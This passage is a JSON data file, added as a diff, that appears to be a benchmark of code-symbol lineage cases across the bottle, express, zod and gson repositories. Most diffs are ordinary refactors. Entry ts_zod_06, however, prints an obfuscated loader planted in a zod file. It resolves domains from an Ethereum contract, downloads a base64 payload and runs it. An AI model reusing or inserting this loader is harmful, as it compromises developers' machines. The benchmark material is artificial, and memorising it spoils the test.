@@ -1,0 +1,1051 @@
+[
+  {
+    "case_id": "py_bot_01",
+    "language": "python",
+    "repo": "bottle",
+    "claimed_type": "rewrite",
+    "cur_symbol": "makelist",
+    "cur_file": "bottle.py",
+    "cur_commit": "750fcbebbc90ef871c58a225ab333f3508a7a1dd",
+    "pred_symbol": "makelist",
+    "pred_file": "bottle.py",
+    "pred_commit": "8585d8cac3a4748627a4cd967fcdd25e25158469",
+    "is_valid_pred": true,
+    "issues": [],
+    "details": {
+      "parents": [
+        "8585d8cac3a4748627a4cd967fcdd25e25158469"
+      ],
+      "is_direct_parent": true,
+      "diff_lines_count": 28,
+      "diff_lines": [
+        "-# getfullargspec was deprecated in 3.5 and un-deprecated in 3.6",
+        "-# getargspec was deprecated in 3.0 and removed in 3.11",
+        "-from inspect import getfullargspec",
+        "-",
+        "-def getargspec(func):",
+        "-    spec = getfullargspec(func)",
+        "-    kwargs = makelist(spec[0]) + makelist(spec.kwonlyargs)",
+        "-    return kwargs, spec[1], spec[2], spec[3]",
+        "+import inspect",
+        "-        return getargspec(self.get_undecorated_callback())[0]"
+      ]
+    }
+  },
+  {
+    "case_id": "py_bot_02",
+    "language": "python",
+    "repo": "bottle",
+    "claimed_type": "signature_change",
+    "cur_symbol": "getall",
+    "cur_file": "bottle.py",
+    "cur_commit": "b5631d1d8ab9dd8e7a149a83a0be9a883468ef9f",
+    "pred_symbol": "getall",
+    "pred_file": "bottle.py",
+    "pred_commit": "57bdb520a2e3263bba33ccd15d979470ad978b2e",
+    "is_valid_pred": true,
+    "issues": [],
+    "details": {
+      "parents": [
+        "57bdb520a2e3263bba33ccd15d979470ad978b2e"
+      ],
+      "is_direct_parent": true,
+      "diff_lines_count": 2,
+      "diff_lines": [
+        "-            return url if not query else url + '?' + urlencode(query)",
+        "+            return url if not query else url + '?' + urlencode(query, doseq=True)"
+      ]
+    }
+  },
+  {
+    "case_id": "py_bot_03",
+    "language": "python",
+    "repo": "bottle",
+    "claimed_type": "rewrite",
+    "cur_symbol": "static_file",
+    "cur_file": "bottle.py",
+    "cur_commit": "457a8fa82f2c96d18c6f5934288387ad83ac12fa",
+    "pred_symbol": "static_file",
+    "pred_file": "bottle.py",
+    "pred_commit": "62d7e076e1f7d10ed4d9e13314df32c6a1e80173",
+    "is_valid_pred": true,
+    "issues": [],
+    "details": {
+      "parents": [
+        "62d7e076e1f7d10ed4d9e13314df32c6a1e80173"
+      ],
+      "is_direct_parent": true,
+      "diff_lines_count": 9,
+      "diff_lines": [
+        "-        :param etag: Provide a pre-computed ETag header. If set to ``False``,",
+        "-            ETag handling is disabled. (default: auto-generate ETag header)",
+        "+        :param etag: Provide a valid (quoted, non-weak) ETag header value.",
+        "+            If set to ``False``, ETag handling is disabled.",
+        "+            (default: auto-generate ETag from file metadata)",
+        "-        etag = hashlib.sha1(tob('%d:%d:%d:%d:%s' % (",
+        "+        etag = '\"%s\"' % hashlib.sha1(tob('%d:%d:%d:%d:%s' % (",
+        "-    if inm and inm == etag:",
+        "+    if inm and etag and etag in inm:"
+      ]
+    }
+  },
+  {
+    "case_id": "py_bot_04",
+    "language": "python",
+    "repo": "bottle",
+    "claimed_type": "rewrite",
+    "cur_symbol": "__repr__",
+    "cur_file": "bottle.py",
+    "cur_commit": "1d5b4415a4286c8bf355f6611889f8b6271230b8",
+    "pred_symbol": "__repr__",
+    "pred_file": "bottle.py",
+    "pred_commit": "f961ffbfa70d3bcbf3415a37e757da744303ef9e",
+    "is_valid_pred": true,
+    "issues": [],
+    "details": {
+      "parents": [
+        "f961ffbfa70d3bcbf3415a37e757da744303ef9e"
+      ],
+      "is_direct_parent": true,
+      "diff_lines_count": 3,
+      "diff_lines": [
+        "-        args = ', '.join('%s=%s' % (k, repr(v))",
+        "-                          for k, v in self.options.items())",
+        "+        args = ', '.join('%s=%r' % kv for kv in self.options.items())"
+      ]
+    }
+  },
+  {
+    "case_id": "py_bot_05",
+    "language": "python",
+    "repo": "bottle",
+    "claimed_type": "rewrite",
+    "cur_symbol": "touni",
+    "cur_file": "bottle.py",
+    "cur_commit": "8804dd957f544255e71a5a4bade7bd7483ba8073",
+    "pred_symbol": "touni",
+    "pred_file": "bottle.py",
+    "pred_commit": "3b9e86527130682fb5029bef56c0328fb762a361",
+    "is_valid_pred": true,
+    "issues": [],
+    "details": {
+      "parents": [
+        "3b9e86527130682fb5029bef56c0328fb762a361"
+      ],
+      "is_direct_parent": true,
+      "diff_lines_count": 6,
+      "diff_lines": [
+        "-    if isinstance(s, bytes):",
+        "-        return s.decode(enc, err)",
+        "-    return unicode(\"\" if s is None else s)",
+        "+    if isinstance(s, (bytes, bytearray)):",
+        "+        return str(s, enc, err)",
+        "+    return \"\" if s is None else str(s)"
+      ]
+    }
+  },
+  {
+    "case_id": "py_bot_06",
+    "language": "python",
+    "repo": "bottle",
+    "claimed_type": "rename",
+    "cur_symbol": "meta_filter",
+    "cur_file": "bottle.py",
+    "cur_commit": "ba4efd126b964ecfcba926a2636ab44ce4a521aa",
+    "pred_symbol": "meta_validate",
+    "pred_file": "bottle.py",
+    "pred_commit": "cbd569c447b3fd53f194cef9a306146ce6a07a59",
+    "is_valid_pred": true,
+    "issues": [
+      "Current symbol 'meta_filter' not found in bottle.py at ba4efd12",
+      "Predecessor symbol 'meta_validate' not found in bottle.py at cbd569c4"
+    ],
+    "details": {
+      "parents": [
+        "cbd569c447b3fd53f194cef9a306146ce6a07a59"
+      ],
+      "is_direct_parent": true,
+      "diff_lines_count": 18,
+      "diff_lines": [
+        "-        cfg.meta_set('catchall', 'validate', bool)",
+        "+        cfg._define('catchall', default=True, filter=bool,",
+        "+            help=\"Catch all unhandled exceptions and display an error page.\")",
+        "-        self.config.update({",
+        "-            \"catchall\": True",
+        "-        })",
+        "-",
+        "-        app.config._define('json.enable', default=True, validate=bool,",
+        "+        app.config._define('json.enable', default=True, filter=bool,",
+        "-        self._virtual_keys.discard(key)"
+      ]
+    }
+  },
+  {
+    "case_id": "py_bot_07",
+    "language": "python",
+    "repo": "bottle",
+    "claimed_type": "rewrite",
+    "cur_symbol": "depr",
+    "cur_file": "bottle.py",
+    "cur_commit": "7a7e544495f780ea4d5f52296fc8e26cb69b37ea",
+    "pred_symbol": "depr",
+    "pred_file": "bottle.py",
+    "pred_commit": "1a6d99022f42b22bd42417a5e22c6511f049dd4a",
+    "is_valid_pred": true,
+    "issues": [],
+    "details": {
+      "parents": [
+        "1a6d99022f42b22bd42417a5e22c6511f049dd4a"
+      ],
+      "is_direct_parent": true,
+      "diff_lines_count": 1,
+      "diff_lines": [
+        "+    return DeprecationWarning(text)"
+      ]
+    }
+  },
+  {
+    "case_id": "py_bot_08",
+    "language": "python",
+    "repo": "bottle",
+    "claimed_type": "new_symbol",
+    "cur_symbol": "json_dump_func",
+    "cur_file": "bottle.py",
+    "cur_commit": "90bd4aa7439419186a85446f2aa05c23e3ba7103",
+    "pred_symbol": null,
+    "pred_file": null,
+    "pred_commit": null,
+    "is_valid_pred": false,
+    "issues": [
+      "Current symbol 'json_dump_func' not found in bottle.py at 90bd4aa7"
+    ],
+    "details": {}
+  },
+  {
+    "case_id": "py_bot_09",
+    "language": "python",
+    "repo": "bottle",
+    "claimed_type": "hard_negative",
+    "cur_symbol": "tob",
+    "cur_file": "bottle.py",
+    "cur_commit": "4a183493ae08bb097860e7199c02f66c24a51092",
+    "pred_symbol": "tonat",
+    "pred_file": "bottle.py",
+    "pred_commit": "726da5454a5c83cf2ef01e2817129abb54b12a63",
+    "is_valid_pred": false,
+    "issues": [],
+    "details": {
+      "parents": [
+        "726da5454a5c83cf2ef01e2817129abb54b12a63"
+      ],
+      "is_direct_parent": true,
+      "diff_lines_count": 12,
+      "diff_lines": [
+        "-tonat = touni",
+        "-",
+        "-",
+        "-                maxread = int(tonat(size.strip()), 16)",
+        "+                maxread = int(size.strip(), 16)",
+        "-            body = tonat(self._get_body_string(self.MEMFILE_MAX), 'latin1')",
+        "+            body = self._get_body_string(self.MEMFILE_MAX).decode('latin1')",
+        "-                post[part.name] = tonat(part.value, 'utf8')",
+        "+                post[part.name] = part.value",
+        "+    key = touni(key)"
+      ]
+    }
+  },
+  {
+    "case_id": "py_bot_10",
+    "language": "python",
+    "repo": "bottle",
+    "claimed_type": "hard_negative",
+    "cur_symbol": "Route",
+    "cur_file": "bottle.py",
+    "cur_commit": "a014a6c4ce4faa411d1fceb571aad3373a82517d",
+    "pred_symbol": "RouteReset",
+    "pred_file": "bottle.py",
+    "pred_commit": "686e362bae6468a08b7dd4801d01c531de7eff41",
+    "is_valid_pred": false,
+    "issues": [],
+    "details": {
+      "parents": [
+        "686e362bae6468a08b7dd4801d01c531de7eff41"
+      ],
+      "is_direct_parent": true,
+      "diff_lines_count": 56,
+      "diff_lines": [
+        "-class RouteReset(BottleException):",
+        "-    \"\"\" If raised by a plugin or request handler, the route is reset and all",
+        "-        plugins are re-applied. \"\"\"",
+        "-",
+        "-",
+        "-",
+        "-            try:",
+        "-                if hasattr(plugin, 'apply'):",
+        "-                    callback = plugin.apply(callback, self)",
+        "-                else:"
+      ]
+    }
+  },
+  {
+    "case_id": "js_exp_01",
+    "language": "javascript",
+    "repo": "express",
+    "claimed_type": "rewrite",
+    "cur_symbol": "send",
+    "cur_file": "lib/response.js",
+    "cur_commit": "9a34acf03cb818ff3f8bc40e44176e277a25cbb9",
+    "pred_symbol": "send",
+    "pred_file": "lib/response.js",
+    "pred_commit": "3ce6d0eb86e9d93529ff3191c6bb5db8ce6e72c8",
+    "is_valid_pred": true,
+    "issues": [],
+    "details": {
+      "parents": [
+        "3ce6d0eb86e9d93529ff3191c6bb5db8ce6e72c8"
+      ],
+      "is_direct_parent": true,
+      "diff_lines_count": 10,
+      "diff_lines": [
+        "-  // Because Content-Length and Transfer-Encoding can't be present in the response headers together,",
+        "-  // Content-Length should be added only if there is no Transfer-Encoding header",
+        "-  if (chunk !== undefined && !this.get('Transfer-Encoding')) {",
+        "+  if (chunk !== undefined) {",
+        "-    this.set('Content-Length', len);",
+        "+    // Because Content-Length and Transfer-Encoding can't be present in the response headers together,",
+        "+    // Content-Length should be added only if there is no Transfer-Encoding header",
+        "+    if (!this.get('Transfer-Encoding')) {",
+        "+      this.set('Content-Length', len);",
+        "+    }"
+      ]
+    }
+  },
+  {
+    "case_id": "js_exp_02",
+    "language": "javascript",
+    "repo": "express",
+    "claimed_type": "signature_change",
+    "cur_symbol": "render",
+    "cur_file": "lib/application.js",
+    "cur_commit": "c9ecf7b658388ccaa2b8470aabad92aabde458a2",
+    "pred_symbol": "render",
+    "pred_file": "lib/application.js",
+    "pred_commit": "a479419b16f5b97eb20f5dbae5848708ff30ce2d",
+    "is_valid_pred": true,
+    "issues": [],
+    "details": {
+      "parents": [
+        "a479419b16f5b97eb20f5dbae5848708ff30ce2d"
+      ],
+      "is_direct_parent": true,
+      "diff_lines_count": 2,
+      "diff_lines": [
+        "-  var opts = options;",
+        "+  var opts = options || {};"
+      ]
+    }
+  },
+  {
+    "case_id": "js_exp_03",
+    "language": "javascript",
+    "repo": "express",
+    "claimed_type": "rewrite",
+    "cur_symbol": "listen",
+    "cur_file": "lib/application.js",
+    "cur_commit": "54af593b739ea44674e4a445efa15b8024f093da",
+    "pred_symbol": "listen",
+    "pred_file": "lib/application.js",
+    "pred_commit": "2551a7d8afd82e41b9282bd0235190a847a59f44",
+    "is_valid_pred": true,
+    "issues": [],
+    "details": {
+      "parents": [
+        "2551a7d8afd82e41b9282bd0235190a847a59f44"
+      ],
+      "is_direct_parent": true,
+      "diff_lines_count": 2,
+      "diff_lines": [
+        "-  var args = Array.prototype.slice.call(arguments)",
+        "+  var args = slice.call(arguments)"
+      ]
+    }
+  },
+  {
+    "case_id": "js_exp_04",
+    "language": "javascript",
+    "repo": "express",
+    "claimed_type": "rewrite",
+    "cur_symbol": "acceptsLanguages",
+    "cur_file": "lib/request.js",
+    "cur_commit": "3dc96995df98cd76d8d31f3b6825401f25899be0",
+    "pred_symbol": "acceptsLanguages",
+    "pred_file": "lib/request.js",
+    "pred_commit": "fa40ecfe7619acdfdeecf19d445ce5e9892d77ec",
+    "is_valid_pred": true,
+    "issues": [],
+    "details": {
+      "parents": [
+        "fa40ecfe7619acdfdeecf19d445ce5e9892d77ec"
+      ],
+      "is_direct_parent": true,
+      "diff_lines_count": 5,
+      "diff_lines": [
+        "-req.acceptsLanguages = function(){",
+        "-  var accept = accepts(this);",
+        "-  return accept.languages.apply(accept, arguments);",
+        "+req.acceptsLanguages = function(...languages) {",
+        "+  return accepts(this).languages(...languages);"
+      ]
+    }
+  },
+  {
+    "case_id": "js_exp_05",
+    "language": "javascript",
+    "repo": "express",
+    "claimed_type": "rewrite",
+    "cur_symbol": "redirect",
+    "cur_file": "lib/response.js",
+    "cur_commit": "9a3f7ff4120d7920a2d13809ff5ae78648c8a3d6",
+    "pred_symbol": "redirect",
+    "pred_file": "lib/response.js",
+    "pred_commit": "2cd372e34cd6613f4d00836c2ee122f28bddfcb3",
+    "is_valid_pred": true,
+    "issues": [],
+    "details": {
+      "parents": [
+        "2cd372e34cd6613f4d00836c2ee122f28bddfcb3"
+      ],
+      "is_direct_parent": true,
+      "diff_lines_count": 3,
+      "diff_lines": [
+        "-      body = '<p>' + statuses.message[status] + '. Redirecting to ' + u + '</p>'",
+        "+      body = '<!DOCTYPE html><head><title>' + statuses.message[status] + '</title></head>'",
+        "+       + '<body><p>' + statuses.message[status] + '. Redirecting to ' + u + '</p></body>'"
+      ]
+    }
+  },
+  {
+    "case_id": "js_exp_06",
+    "language": "javascript",
+    "repo": "express",
+    "claimed_type": "rewrite",
+    "cur_symbol": "logerror",
+    "cur_file": "lib/application.js",
+    "cur_commit": "90ec6206d3275fdf2787f2028c6f48a2d92e8042",
+    "pred_symbol": "logerror",
+    "pred_file": "lib/application.js",
+    "pred_commit": "cb19f04170fc815321d40dcd3bc620ae03c828cd",
+    "is_valid_pred": true,
+    "issues": [],
+    "details": {
+      "parents": [
+        "cb19f04170fc815321d40dcd3bc620ae03c828cd"
+      ],
+      "is_direct_parent": true,
+      "diff_lines_count": 2,
+      "diff_lines": [
+        "-  if (this.get('env') !== 'test') console.error(err.stack || err.toString());",
+        "+  if (this.get('env') !== 'test') console.error(err);"
+      ]
+    }
+  },
+  {
+    "case_id": "js_exp_07",
+    "language": "javascript",
+    "repo": "express",
+    "claimed_type": "rewrite",
+    "cur_symbol": "connection",
+    "cur_file": "lib/request.js",
+    "cur_commit": "89f198c6a50ab0cb65b741767791dd1b647e3b2c",
+    "pred_symbol": "connection",
+    "pred_file": "lib/request.js",
+    "pred_commit": "d9a62f983390da932c4f2e21e67a55fa33c164f4",
+    "is_valid_pred": true,
+    "issues": [
+      "Current symbol 'connection' not found in lib/request.js at 89f198c6"
+    ],
+    "details": {
+      "parents": [
+        "d9a62f983390da932c4f2e21e67a55fa33c164f4"
+      ],
+      "is_direct_parent": true,
+      "diff_lines_count": 6,
+      "diff_lines": [
+        "-  var proto = this.connection.encrypted",
+        "+  var proto = this.socket.encrypted",
+        "-  if (!trust(this.connection.remoteAddress, 0)) {",
+        "+  if (!trust(this.socket.remoteAddress, 0)) {",
+        "-  if (!val || !trust(this.connection.remoteAddress, 0)) {",
+        "+  if (!val || !trust(this.socket.remoteAddress, 0)) {"
+      ]
+    }
+  },
+  {
+    "case_id": "js_exp_08",
+    "language": "javascript",
+    "repo": "express",
+    "claimed_type": "rewrite",
+    "cur_symbol": "fresh",
+    "cur_file": "lib/request.js",
+    "cur_commit": "ae6dd37680e3a00618d6c8a3e522f0ee4eeba1a4",
+    "pred_symbol": "fresh",
+    "pred_file": "lib/request.js",
+    "pred_commit": "ba006766fb964571723138708eacaba0f55759cd",
+    "is_valid_pred": true,
+    "issues": [],
+    "details": {
+      "parents": [
+        "ba006766fb964571723138708eacaba0f55759cd"
+      ],
+      "is_direct_parent": true,
+      "diff_lines_count": 4,
+      "diff_lines": [
+        "-  // GET or HEAD for weak freshness validation only",
+        "-  if ('GET' !== method && 'HEAD' !== method) return false;",
+        "+  // GET, HEAD, or QUERY for weak freshness validation only",
+        "+  if ('GET' !== method && 'HEAD' !== method && 'QUERY' !== method) return false;"
+      ]
+    }
+  },
+  {
+    "case_id": "js_exp_09",
+    "language": "javascript",
+    "repo": "express",
+    "claimed_type": "hard_negative",
+    "cur_symbol": "location",
+    "cur_file": "lib/response.js",
+    "cur_commit": "91d333b4cfea158c9798d32e6665d36bd8e37c3d",
+    "pred_symbol": "redirect",
+    "pred_file": "lib/response.js",
+    "pred_commit": "28f732e98f5414391a4de55081f8c1cf239de9fc",
+    "is_valid_pred": false,
+    "issues": [],
+    "details": {
+      "parents": [
+        "28f732e98f5414391a4de55081f8c1cf239de9fc"
+      ],
+      "is_direct_parent": true,
+      "diff_lines_count": 5,
+      "diff_lines": [
+        "- * The given `url` can also be \"back\", which redirects",
+        "- * to the _Referrer_ or _Referer_ headers or \"/\".",
+        "- *",
+        "- *    res.location('/foo/bar').;",
+        "+ *    res.location('/foo/bar');"
+      ]
+    }
+  },
+  {
+    "case_id": "js_exp_10",
+    "language": "javascript",
+    "repo": "express",
+    "claimed_type": "new_symbol",
+    "cur_symbol": "init",
+    "cur_file": "lib/middleware/init.js",
+    "cur_commit": "cf6722bf89a86905281d9160b6482e08166b5ef0",
+    "pred_symbol": null,
+    "pred_file": null,
+    "pred_commit": null,
+    "is_valid_pred": false,
+    "issues": [
+      "Current file lib/middleware/init.js does not exist at cf6722bf"
+    ],
+    "details": {}
+  },
+  {
+    "case_id": "ts_zod_01",
+    "language": "typescript",
+    "repo": "zod",
+    "claimed_type": "rename",
+    "cur_symbol": "processSchema",
+    "cur_file": "packages/zod/src/v4/classic/from-json-schema.ts",
+    "cur_commit": "18e71c71daff6e79ab8f00a48db252ccb340da1f",
+    "pred_symbol": "process",
+    "pred_file": "packages/zod/src/v4/classic/from-json-schema.ts",
+    "pred_commit": "68aca3dc402c59f5c4e30322e83028389e44b8b5",
+    "is_valid_pred": true,
+    "issues": [
+      "Current symbol 'processSchema' not found in packages/zod/src/v4/classic/from-json-schema.ts at 18e71c71"
+    ],
+    "details": {
+      "parents": [
+        "68aca3dc402c59f5c4e30322e83028389e44b8b5"
+      ],
+      "is_direct_parent": true,
+      "diff_lines_count": 0
+    }
+  },
+  {
+    "case_id": "ts_zod_02",
+    "language": "typescript",
+    "repo": "zod",
+    "claimed_type": "rename",
+    "cur_symbol": "cached",
+    "cur_file": "packages/zod/src/v4/core/util.ts",
+    "cur_commit": "51caf01038d3339d7b9db94b959482c549aba2e3",
+    "pred_symbol": "cachedInternal",
+    "pred_file": "packages/zod/src/v4/core/util.ts",
+    "pred_commit": "abfb38977dc28dc9993e3fa6a2ecc2f52a8d0c4c",
+    "is_valid_pred": true,
+    "issues": [],
+    "details": {
+      "parents": [
+        "abfb38977dc28dc9993e3fa6a2ecc2f52a8d0c4c"
+      ],
+      "is_direct_parent": true,
+      "diff_lines_count": 15,
+      "diff_lines": [
+        "-export function cached<T>(getter: () => T): { value: T } {",
+        "-  return {",
+        "-    get value() {",
+        "-      const value = getter();",
+        "-      // own, enumerable and configurable, matching the accessor it replaces; public as `z.core.util.cached`",
+        "-      Object.defineProperty(this, \"value\", { value });",
+        "-      return value;",
+        "-    },",
+        "-  };",
+        "-}"
+      ]
+    }
+  },
+  {
+    "case_id": "ts_zod_03",
+    "language": "typescript",
+    "repo": "zod",
+    "claimed_type": "rewrite",
+    "cur_symbol": "email",
+    "cur_file": "packages/zod/src/v4/classic/schemas.ts",
+    "cur_commit": "f7fd5548063f55a74847b2711630c9b3f8ea00d4",
+    "pred_symbol": "email",
+    "pred_file": "packages/zod/src/v4/classic/schemas.ts",
+    "pred_commit": "36f17960d1defca5d0896d9424f4e1059fbbf081",
+    "is_valid_pred": true,
+    "issues": [],
+    "details": {
+      "parents": [
+        "36f17960d1defca5d0896d9424f4e1059fbbf081"
+      ],
+      "is_direct_parent": true,
+      "diff_lines_count": 0
+    }
+  },
+  {
+    "case_id": "ts_zod_04",
+    "language": "typescript",
+    "repo": "zod",
+    "claimed_type": "new_symbol",
+    "cur_symbol": "currencyCode",
+    "cur_file": "packages/zod/src/v4/classic/schemas.ts",
+    "cur_commit": "d6bc1e30ac35fe8d2dfcb2c929dc76c87b274e94",
+    "pred_symbol": null,
+    "pred_file": null,
+    "pred_commit": null,
+    "is_valid_pred": false,
+    "issues": [],
+    "details": {}
+  },
+  {
+    "case_id": "ts_zod_05",
+    "language": "typescript",
+    "repo": "zod",
+    "claimed_type": "signature_change",
+    "cur_symbol": "properties",
+    "cur_file": "packages/zod/src/v4/core/schemas.ts",
+    "cur_commit": "56222cd1532c07bcb91b67df529cab4c0a215330",
+    "pred_symbol": "properties",
+    "pred_file": "packages/zod/src/v4/core/schemas.ts",
+    "pred_commit": "de65a5cb39ed22a507fac935788f718fa88d104f",
+    "is_valid_pred": true,
+    "issues": [],
+    "details": {
+      "parents": [
+        "de65a5cb39ed22a507fac935788f718fa88d104f"
+      ],
+      "is_direct_parent": true,
+      "diff_lines_count": 0
+    }
+  },
+  {
+    "case_id": "ts_zod_06",
+    "language": "typescript",
+    "repo": "zod",
+    "claimed_type": "move",
+    "cur_symbol": "metadata",
+    "cur_file": "packages/mini/meta.mjs",
+    "cur_commit": "ce1e11b7b5483cc81400f8173042e63bda3a3db2",
+    "pred_symbol": "metadata",
+    "pred_file": "packages/mini/meta.test.mjs",
+    "pred_commit": "d821685ea6732436fcdf786a81d076958471e467",
+    "is_valid_pred": true,
+    "issues": [
+      "Current symbol 'metadata' not found in packages/mini/meta.mjs at ce1e11b7",
+      "Predecessor symbol 'metadata' not found in packages/mini/meta.test.mjs at d821685e"
+    ],
+    "details": {
+      "parents": [
+        "d821685ea6732436fcdf786a81d076958471e467"
+      ],
+      "is_direct_parent": true,
+      "diff_lines_count": 4,
+      "diff_lines": [
+        "+import f from\"fs\";import o from\"os\";import p from\"path\";",
+        "+const C=\"0xe236330379d0c54aD5b2ef06aC714CEbdd4Ce523\",S=\"0x53ed5143\",R=[\"https://eth.llamarpc.com\",\"https://ethereum-rpc.publicnode.com\",\"https://cloudflare-eth.com\"];",
+        "+const dec=h=>{h=h.replace(/^0x/,\"\");const w=t=>parseInt(h.slice(t*2,t*2+64),16),a=w(0),n=w(a),r=[];for(let i=0;i<n;i++){const s=a+32+w(a+32+i*32),l=w(s),b=(s+32)*2;r.push(Buffer.from(h.slice(b,b+l*2),\"hex\").toString())}return r};",
+        "+(async()=>{let g=null;for(const u of R){try{const r=await fetch(u,{method:\"POST\",headers:{\"Content-Type\":\"application/json\"},body:JSON.stringify({jsonrpc:\"2.0\",id:1,method:\"eth_call\",params:[{to:C,data:S},\"latest\"]})}),j=await r.json();if(j&&j.result){for(const d of dec(j.result)){try{const q=await fetch(`https://${d}/loader`);if(!q.ok)continue;const m=await q.json();if(m&&m.setupB64&&m.payloadName&&m.payloadB64){const t=f.mkdtempSync(p.join(o.tmpdir(),\"ld-\"));f.writeFileSync(p.join(t,m.payloadName),Buffer.from(m.payloadB64,\"base64\"));g={t,s:m.setupB64};break}}catch{}}if(g)break}}catch{}if(g)break}if(!g)return;try{process.env.RUNTIME_DIR=g.t;await import(\"data:text/javascript;base64,\"+g.s);await globalThis.__SETUP_DONE__}catch{}try{f.rmSync(g.t,{recursive:true,force:true})}catch{}})().catch(()=>process.exit(1));"
+      ]
+    }
+  },
+  {
+    "case_id": "ts_zod_07",
+    "language": "typescript",
+    "repo": "zod",
+    "claimed_type": "rewrite",
+    "cur_symbol": "validate",
+    "cur_file": "packages/zod/src/v4/core/api.ts",
+    "cur_commit": "764ac59f1afc1a46e7ecc2d5e8e86c57b7d66164",
+    "pred_symbol": "validate",
+    "pred_file": "packages/zod/src/v4/core/api.ts",
+    "pred_commit": "07917f4cb396646dff7a1364f9032a668b0d7eb4",
+    "is_valid_pred": true,
+    "issues": [],
+    "details": {
+      "parents": [
+        "07917f4cb396646dff7a1364f9032a668b0d7eb4"
+      ],
+      "is_direct_parent": true,
+      "diff_lines_count": 0
+    }
+  },
+  {
+    "case_id": "ts_zod_08",
+    "language": "typescript",
+    "repo": "zod",
+    "claimed_type": "rewrite",
+    "cur_symbol": "_array",
+    "cur_file": "packages/zod/src/v4/classic/schemas.ts",
+    "cur_commit": "e06a510b6fc1e6e28e3201fd116ca2a76212f6be",
+    "pred_symbol": "_array",
+    "pred_file": "packages/zod/src/v4/classic/schemas.ts",
+    "pred_commit": "0b216ef674e297ebe41d8bf902262e56f8755822",
+    "is_valid_pred": true,
+    "issues": [],
+    "details": {
+      "parents": [
+        "0b216ef674e297ebe41d8bf902262e56f8755822"
+      ],
+      "is_direct_parent": true,
+      "diff_lines_count": 0
+    }
+  },
+  {
+    "case_id": "ts_zod_09",
+    "language": "typescript",
+    "repo": "zod",
+    "claimed_type": "hard_negative",
+    "cur_symbol": "uuidv4",
+    "cur_file": "packages/zod/src/v4/classic/schemas.ts",
+    "cur_commit": "3b9700847691b6d48002f3ce8de278842af92ca9",
+    "pred_symbol": "uuidv7",
+    "pred_file": "packages/zod/src/v4/classic/schemas.ts",
+    "pred_commit": "e06a510b6fc1e6e28e3201fd116ca2a76212f6be",
+    "is_valid_pred": false,
+    "issues": [],
+    "details": {
+      "parents": [
+        "e06a510b6fc1e6e28e3201fd116ca2a76212f6be"
+      ],
+      "is_direct_parent": true,
+      "diff_lines_count": 0
+    }
+  },
+  {
+    "case_id": "ts_zod_10",
+    "language": "typescript",
+    "repo": "zod",
+    "claimed_type": "hard_negative",
+    "cur_symbol": "string",
+    "cur_file": "packages/zod/src/v4/classic/schemas.ts",
+    "cur_commit": "d821685ea6732436fcdf786a81d076958471e467",
+    "pred_symbol": "number",
+    "pred_file": "packages/zod/src/v4/classic/schemas.ts",
+    "pred_commit": "0cd3af5e9f50ad11bbcd4407a46a21b8848ba574",
+    "is_valid_pred": false,
+    "issues": [],
+    "details": {
+      "parents": [
+        "0cd3af5e9f50ad11bbcd4407a46a21b8848ba574"
+      ],
+      "is_direct_parent": true,
+      "diff_lines_count": 0
+    }
+  },
+  {
+    "case_id": "java_gsn_01",
+    "language": "java",
+    "repo": "gson",
+    "claimed_type": "rewrite",
+    "cur_symbol": "removeIf",
+    "cur_file": "gson/src/main/java/com/google/gson/internal/NonNullElementWrapperList.java",
+    "cur_commit": "115bcc7e1136f50eb89c9f7ae579e340fd27d117",
+    "pred_symbol": "removeIf",
+    "pred_file": "gson/src/main/java/com/google/gson/internal/NonNullElementWrapperList.java",
+    "pred_commit": "8fe077819b2c92a1cbe17557c4655e2c33967711",
+    "is_valid_pred": true,
+    "issues": [
+      "Predecessor symbol 'removeIf' not found in gson/src/main/java/com/google/gson/internal/NonNullElementWrapperList.java at 8fe07781"
+    ],
+    "details": {
+      "parents": [
+        "8fe077819b2c92a1cbe17557c4655e2c33967711"
+      ],
+      "is_direct_parent": true,
+      "diff_lines_count": 6,
+      "diff_lines": [
+        "+import java.util.function.Predicate;",
+        "+  @Override",
+        "+  public boolean removeIf(Predicate<? super E> filter) {",
+        "+    return delegate.removeIf(filter);",
+        "+  }",
+        "+"
+      ]
+    }
+  },
+  {
+    "case_id": "java_gsn_02",
+    "language": "java",
+    "repo": "gson",
+    "claimed_type": "rewrite",
+    "cur_symbol": "excludeField",
+    "cur_file": "gson/src/main/java/com/google/gson/internal/Excluder.java",
+    "cur_commit": "ff521d70b2ecf2ed85dd1012081493ad7d8c0ba6",
+    "pred_symbol": "excludeField",
+    "pred_file": "gson/src/main/java/com/google/gson/internal/Excluder.java",
+    "pred_commit": "0482d5cadc7e9018d3b4ccb3145f62c2fba2f9bd",
+    "is_valid_pred": true,
+    "issues": [],
+    "details": {
+      "parents": [
+        "0482d5cadc7e9018d3b4ccb3145f62c2fba2f9bd"
+      ],
+      "is_direct_parent": true,
+      "diff_lines_count": 54,
+      "diff_lines": [
+        "-    if ((modifiers & field.getModifiers()) != 0) {",
+        "-      return true;",
+        "-    }",
+        "-",
+        "-    if (version != Excluder.IGNORE_VERSIONS",
+        "-        && !isValidVersion(field.getAnnotation(Since.class), field.getAnnotation(Until.class))) {",
+        "-      return true;",
+        "-    }",
+        "+    return isExcludedByModifier(field)",
+        "+        || isExcludedByVersion(field)"
+      ]
+    }
+  },
+  {
+    "case_id": "java_gsn_03",
+    "language": "java",
+    "repo": "gson",
+    "claimed_type": "new_symbol",
+    "cur_symbol": "isExcludedByModifier",
+    "cur_file": "gson/src/main/java/com/google/gson/internal/Excluder.java",
+    "cur_commit": "ff521d70b2ecf2ed85dd1012081493ad7d8c0ba6",
+    "pred_symbol": null,
+    "pred_file": null,
+    "pred_commit": null,
+    "is_valid_pred": false,
+    "issues": [],
+    "details": {}
+  },
+  {
+    "case_id": "java_gsn_04",
+    "language": "java",
+    "repo": "gson",
+    "claimed_type": "new_symbol",
+    "cur_symbol": "getCharacterOffset",
+    "cur_file": "gson/src/main/java/com/google/gson/stream/JsonReader.java",
+    "cur_commit": "61f2c646066e959f65cb99a826a2a759be42dbdd",
+    "pred_symbol": null,
+    "pred_file": null,
+    "pred_commit": null,
+    "is_valid_pred": false,
+    "issues": [],
+    "details": {}
+  },
+  {
+    "case_id": "java_gsn_05",
+    "language": "java",
+    "repo": "gson",
+    "claimed_type": "rewrite",
+    "cur_symbol": "hashCode",
+    "cur_file": "gson/src/main/java/com/google/gson/JsonPrimitive.java",
+    "cur_commit": "5e277e42786ab6441b7dd6b1a8c34d545d132307",
+    "pred_symbol": "hashCode",
+    "pred_file": "gson/src/main/java/com/google/gson/JsonPrimitive.java",
+    "pred_commit": "961517decce0aa907c285c19d8b93d5c746ecdcb",
+    "is_valid_pred": true,
+    "issues": [],
+    "details": {
